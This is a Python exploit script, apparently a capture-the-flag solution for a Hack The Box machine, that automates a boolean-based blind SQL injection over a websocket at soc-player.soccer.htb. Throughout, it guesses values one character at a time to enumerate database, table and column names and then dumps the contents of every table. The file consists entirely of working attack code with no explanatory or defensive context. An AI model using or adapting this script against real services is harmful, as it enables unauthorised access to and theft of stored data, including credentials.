import json, time, signal, sys
from websocket import create_connection
from pwn import *
import time

sqlValuesToFind = {"DatabasesName":"(select SCHEMA_NAME from information_schema.schemata where schema_name not in ('information_schema','performance_schema','mysql','sys') limit %d,1)",
"TablesName":"(select TABLE_NAME from information_schema.tables where table_schema = '{databaseName}' limit %d,1)", 
"ColumnsName":"(select column_name from information_schema.columns where table_schema = '{databaseName}' and table_name = '{tableName}' limit %d,1)",
"ValuesTable":"(select concat_ws(',',{columnsName}) from {databaseName}.{tableName} limit %d,1)"}
values = {}
values["DatabasesName"] = []
values["TablesName"] = []
values["ColumnsName"] = []
values["ValuesTable"] = []
alphabet = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","_",",","1","2","3","4","5","6","7","8","9","0","@","."]
valueToFind = ""
ws_server = "ws://soc-player.soccer.htb:9091"
ws = create_connection(ws_server)

def formatOne(s: str, field: str, value: str):
	idx_begin = s.find('{'+field+'}')
	idx_end = idx_begin + len(field) + 2
	return s[:idx_begin] + value + s[idx_end:]

def findCharacter(valueToFind, sqlValueToFind):
	for limitIterator in range(11):
		valueToFind = ""
		actualValue.status(valueToFind)
		flag = False
		sqlValueToFindFormated = sqlValueToFind % limitIterator
		for charIterator in range(1,100):
			for letter in alphabet:
				payload = '''"" or binary substr(%s,%d,1) = '%s' -- -''' %  (sqlValueToFindFormated,charIterator,letter)
				data = {
						"id": payload,
				}

				bar.status(f"Trying {sqlValueToFindFormated} with letter {letter} on position {charIterator}")

				dataJSON = json.dumps(data)
				ws.send(dataJSON)
				resp = ws.recv()
				if resp == "Ticket Exists":
					valueToFind += letter
					actualValue.status(valueToFind)
					break
				elif letter == alphabet[-1]:
					flag = True
					break
			if flag == True:
				break
		if flag == True and valueToFind == "":
			return True
			break
		log.info(f"  •{valueToFind}")
		values[index].append(valueToFind)

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)

bar = log.progress("SQLI Boolean based")
bar.status("Starting")
actualValue = log.progress("Actual value")

for index in sqlValuesToFind:
	print("-----------------------------------------------------------------------------------")
	log.info(f"{index}:")
	sqlValueToFindParameters = sqlValuesToFind[index]
	if len(values["DatabasesName"]) > 0:
		for databaseName in values["DatabasesName"]:
			log.info(f"DB: {databaseName}:")
			sqlValueToFindDatabase = formatOne(sqlValuesToFind[index],"databaseName",databaseName)
			if len(values["TablesName"]) > 0:
				for tableName in values["TablesName"]:
					log.info(f"Table: {tableName}:")
					sqlValueToFindTables = formatOne(sqlValueToFindDatabase,"tableName",tableName)
					if len(values["ColumnsName"]) > 0:
						columnsToConcat = (",".join(values["ColumnsName"]))
						log.info(f"  Columns: {columnsToConcat}:")
						sqlValueToFindColumns = formatOne(sqlValueToFindTables,"columnsName",columnsToConcat)
						valueToFind = findCharacter(valueToFind, sqlValueToFindColumns)
						if valueToFind == "":
							actualValue.status(valueToFind)
							break
					else:
						valueToFind = findCharacter(valueToFind, sqlValueToFindTables)
						if valueToFind == "":
							actualValue.status(valueToFind)
							break
			else:
				valueToFind = findCharacter(valueToFind, sqlValueToFindDatabase)
				if valueToFind == "":
					actualValue.status(valueToFind)
					break
	else:
		valueToFind = findCharacter(valueToFind, sqlValueToFindParameters)
		if valueToFind == "":
			actualValue.status(valueToFind)
			break

print("-----------------------------------------------------------------------------------")
ws.close()